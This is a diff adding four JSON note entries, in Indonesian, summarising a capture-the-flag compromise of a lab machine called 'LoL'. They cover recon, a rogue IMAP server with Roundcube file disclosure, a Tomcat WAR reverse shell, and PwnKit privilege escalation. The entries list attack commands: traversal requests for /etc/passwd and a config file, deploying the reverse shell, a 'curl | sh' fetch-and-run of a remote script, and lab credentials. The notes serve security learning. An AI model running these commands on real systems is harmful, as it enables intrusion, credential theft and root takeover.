@@ -3451,5 +3451,214 @@
     "problems": [],
     "summary": "Membuat writeup formal Overthinking dalam format DOCX dengan tema merah (offensive), meliputi attack flow diagram SVG, screenshot placeholders, tabel informasi mesin, dan section lessons learned. Writeup mencakup seluruh fase recon sampai privilege escalation, ditulis dalam perspektif monolog formal Bahasa Indonesia. Dokumentasi stuck points (3-4 hari wordlist tanpa mutasi) menjadi bagian paling valuable dari writeup.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-lol-recon",
+    "date": "2026-06-06",
+    "title": "LoL — Multi-Port Recon: SSL CN Discovery, Version Fingerprinting & Dead End Validation",
+    "platform": "Hacktrace Ranges",
+    "category": "Reconnaissance",
+    "tags": [
+      "nmap",
+      "gobuster",
+      "ssl-certificate",
+      "hostname-discovery",
+      "version-fingerprinting",
+      "directory-listing",
+      "roundcube",
+      "dead-end-validation",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "SSL certificate CN analysis untuk hostname discovery: CN field pada self-signed cert sering berisi internal hostname yang tidak terdaftar di DNS publik",
+      "Roundcube version fingerprinting via CHANGELOG file: file ini sering exposed di web root dan mengandung version history yang presisi",
+      "Directory listing exploitation di /mail/config/: misconfigured web server yang tidak disable directory listing bisa expose file konfigurasi sensitif",
+      "Dead end validation sebagai metodologi: verify secara eksplisit bahwa CVE tertentu tidak applicable (sandboxed, blocked) sebelum pivot — menghemat waktu dan menghindari rabbit hole",
+      "Gobuster multi-port directory enumeration: target dengan banyak service di port berbeda perlu di-enum per-port, bukan hanya port 80/443"
+    ],
+    "terms": [
+      "SSL CN",
+      "Common Name",
+      "Roundcube 1.2.2",
+      "CHANGELOG fingerprinting",
+      "directory listing",
+      "/mail/config/",
+      "Gobuster",
+      "Ghostcat CVE-2020-1938",
+      "CVE-2017-12615",
+      "dead end validation",
+      "multi-port enumeration"
+    ],
+    "commands": [
+      "nmap -sVC --min-rate 1000 -p- -Pn -T4 -oN nmap-lol.log TARGET",
+      "gobuster dir -u https://TARGET:PORT -w /usr/share/wordlists/dirb/common.txt -k",
+      "openssl s_client -connect TARGET:PORT </dev/null 2>/dev/null | openssl x509 -noout -text | grep CN",
+      "curl -sk https://TARGET/mail/CHANGELOG | head -5"
+    ],
+    "problems": [
+      "Ghostcat (CVE-2020-1938) tidak exploitable — Tomcat AJP port sandboxed/tidak accessible dari luar",
+      "Tomcat PUT upload (CVE-2017-12615) blocked — server return 405 atau config melarang PUT method",
+      "SSH dan MySQL tidak exposed ke attacker — hanya accessible internal"
+    ],
+    "summary": "Recon awal terhadap LoL (Hacktrace Ranges) mengidentifikasi multiple services via Nmap. SSL certificate CN analysis mengungkap internal hostname. Roundcube 1.2.2 di-fingerprint via CHANGELOG yang exposed, directory listing di /mail/config/ expose file konfigurasi. Dead end validation terhadap Ghostcat (CVE-2020-1938), PUT upload (CVE-2017-12615), SSH, dan MySQL mengkonfirmasi semua blocked — attack vector yang viable adalah Roundcube webmail.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-lol-rogue-imap",
+    "date": "2026-06-06",
+    "title": "LoL — Rogue IMAP Server + CVE-2017-16651 Roundcube File Disclosure",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "rogue-server",
+      "imap",
+      "roundcube",
+      "cve-2017-16651",
+      "file-disclosure",
+      "ssrf-like",
+      "credential-extraction",
+      "python",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Rogue IMAP server attack: Roundcube memiliki open 'Server' field di login — pointing ke attacker-controlled IMAP server memungkinkan MitM credential dan exploit server-side behaviour",
+      "CVE-2017-16651: Roundcube file disclosure dalam authenticated context — path traversal via _file parameter untuk baca arbitrary file di server",
+      "Python IMAP4rev1 server implementation: respond ke AUTHENTICATE PLAIN, LIST, SELECT, NAMESPACE commands minimal untuk satisfy Roundcube handshake dan masuk authenticated state",
+      "File extraction strategy: target /etc/passwd (user enum), config.inc.php (DB creds), mail server configs (dovecot.conf, postfix main.cf), app configs (tomcat server.xml)",
+      "CVE-2016-9920 limitation: Roundcube RCE via mail() sendmail -X injection — tidak work ketika MTA adalah Postfix (bukan sendmail binary)"
+    ],
+    "terms": [
+      "rogue IMAP server",
+      "IMAP4rev1",
+      "AUTHENTICATE PLAIN",
+      "CVE-2017-16651",
+      "file disclosure",
+      "path traversal",
+      "_file parameter",
+      "config.inc.php",
+      "rcuser:rcp4ssw0rd",
+      "dovecot.conf",
+      "postfix main.cf",
+      "tomcat server.xml",
+      "CVE-2016-9920",
+      "sendmail -X injection",
+      "Postfix MTA"
+    ],
+    "commands": [
+      "python3 rogue_imap.py (custom IMAP4rev1 server, listen port 143/993)",
+      "curl -sk 'https://TARGET/mail/?_task=settings&_action=upload-display&_file=/etc/passwd'",
+      "curl -sk 'https://TARGET/mail/?_task=settings&_action=upload-display&_file=/var/www/html/mail/config/config.inc.php'"
+    ],
+    "problems": [
+      "Roundcube IMAP handshake membutuhkan response yang benar untuk NAMESPACE dan LIST commands — server yang tidak respond dengan benar menyebabkan auth loop",
+      "CVE-2016-9920 sendmail -X RCE gagal karena Postfix sebagai MTA tidak support flag -X seperti sendmail binary asli"
+    ],
+    "summary": "Rogue IMAP server (Python IMAP4rev1) digunakan untuk bypass Roundcube authentication — Server field di-set ke attacker IP, Roundcube melakukan connection ke rogue server dan masuk authenticated state. Dalam context authenticated, CVE-2017-16651 dieksploitasi untuk file disclosure: berhasil extract /etc/passwd, config.inc.php (DB creds rcuser:rcp4ssw0rd), dovecot.conf, postfix main.cf, dan tomcat server.xml. CVE-2016-9920 RCE gagal karena Postfix bukan sendmail.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-lol-tomcat-foothold",
+    "date": "2026-06-06",
+    "title": "LoL — Tomcat Foothold: Contextual Password Guessing + WAR Reverse Shell Deployment",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "tomcat",
+      "war-upload",
+      "reverse-shell",
+      "contextual-password",
+      "jsp",
+      "initial-access",
+      "pwncat",
+      "java-pty",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Contextual password guessing: setelah 250K+ standard wordlist exhausted, pivot ke themed guessing — aplikasi name, machine name, service name sebagai password (tomcat:tomcat123)",
+      "WAR deployment sebagai RCE vector: Tomcat Manager /manager/html mengizinkan upload WAR file; JSP reverse shell di-package sebagai WAR dan di-deploy untuk eksekusi",
+      "JSP reverse shell packaging: zip rce.war rce.jsp — WAR adalah ZIP archive, nama WAR menentukan URL deployment path (/rce/rce.jsp)",
+      "Java 1.7 PTY limitation: Java process tua tidak support proper PTY allocation — nc shell unstable, workaround dengan transfer ke pwncat listener di port terpisah untuk stable shell"
+    ],
+    "terms": [
+      "Tomcat Manager",
+      "/manager/html",
+      "WAR file",
+      "JSP reverse shell",
+      "WAR packaging",
+      "contextual password",
+      "tomcat:tomcat123",
+      "pwncat",
+      "PTY allocation",
+      "Java 1.7",
+      "unstable shell",
+      "shell stabilization"
+    ],
+    "commands": [
+      "zip rce.war rce.jsp",
+      "curl -u tomcat:tomcat123 -T rce.war 'http://TARGET:8080/manager/text/deploy?path=/rce'",
+      "curl http://TARGET:8080/rce/rce.jsp (trigger reverse shell)",
+      "python3 -m pwncat -lp PORT (stable listener sebagai workaround PTY)"
+    ],
+    "problems": [
+      "250K+ password dari standard wordlist (rockyou, SecLists) exhausted tanpa hasil — password sederhana 'tomcat123' tidak ada di wordlist umum",
+      "nc reverse shell unstable karena Java 1.7 tidak support PTY properly — transfer session ke pwncat listener di port berbeda untuk stabilize"
+    ],
+    "summary": "Initial access ke LoL via Tomcat Manager WAR deployment. Standard wordlist brute force (250K+ attempts) gagal; contextual guessing menghasilkan tomcat:tomcat123 — password trivial yang tidak ada di wordlist umum. JSP reverse shell di-package sebagai WAR (zip rce.war rce.jsp) dan di-deploy via /manager/html. Shell via nc unstable karena Java 1.7 PTY limitation — distabilkan dengan transfer ke pwncat listener di port terpisah.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-lol-privesc",
+    "date": "2026-06-06",
+    "title": "LoL — Privilege Escalation: DirtyCow Failed → PwnKit (CVE-2021-4034) via SUID pkexec",
+    "platform": "Hacktrace Ranges",
+    "category": "Privilege Escalation",
+    "tags": [
+      "privilege-escalation",
+      "pwnkit",
+      "cve-2021-4034",
+      "pkexec",
+      "suid",
+      "dirtycow",
+      "cve-2016-5195",
+      "centos",
+      "linpeas",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "LinPEAS enumeration sebagai systematic privesc starting point: identify SUID binaries, kernel version, writable paths, capabilities, cron jobs sekaligus",
+      "DirtyCow (CVE-2016-5195) failure modes: kernel 3.10.0 di CentOS 7 rentan secara teori, tapi compiler flags, race condition timing, atau patched variant bisa menyebabkan compile/runtime failure",
+      "PwnKit (CVE-2021-4034): local privilege escalation via SUID pkexec binary — exploit environment variable manipulation untuk inject arbitrary shared library sebagai root",
+      "SUID pkexec sebagai privesc vector: pkexec adalah PolicyKit binary yang di-set SUID root di mayoritas distro Linux sebelum patch Jan 2022"
+    ],
+    "terms": [
+      "LinPEAS",
+      "DirtyCow",
+      "CVE-2016-5195",
+      "PwnKit",
+      "CVE-2021-4034",
+      "pkexec",
+      "SUID",
+      "PolicyKit",
+      "CentOS 7",
+      "kernel 3.10.0",
+      "local privilege escalation",
+      "shared library injection"
+    ],
+    "commands": [
+      "curl -L https://linpeas.sh | sh",
+      "find / -perm -4000 2>/dev/null | grep pkexec",
+      "gcc -shared -fPIC -o pwnkit.so pwnkit.c && ./pwnkit",
+      "id && cat /home/joni/user.txt && cat /root/root.txt"
+    ],
+    "problems": [
+      "DirtyCow (CVE-2016-5195) dicoba beberapa compile variant — semua gagal di CentOS 7 kernel 3.10.0, kemungkinan karena patched variant atau race condition timing issue",
+      "Pivot dari DirtyCow ke PwnKit setelah LinPEAS menunjukkan SUID pkexec — PwnKit reliable dan tidak bergantung pada race condition"
+    ],
+    "summary": "Privilege escalation di LoL (CentOS 7, kernel 3.10.0): LinPEAS mengidentifikasi kernel version dan SUID binaries. DirtyCow (CVE-2016-5195) dicoba multiple compile variant, semua gagal. SUID pkexec yang teridentifikasi LinPEAS menjadi target PwnKit (CVE-2021-4034) — exploit berhasil memberikan root shell. User flag didapat dari /home/joni/user.txt, root flag dari /root/root.txt.",
+    "url": ""
   }
 ]
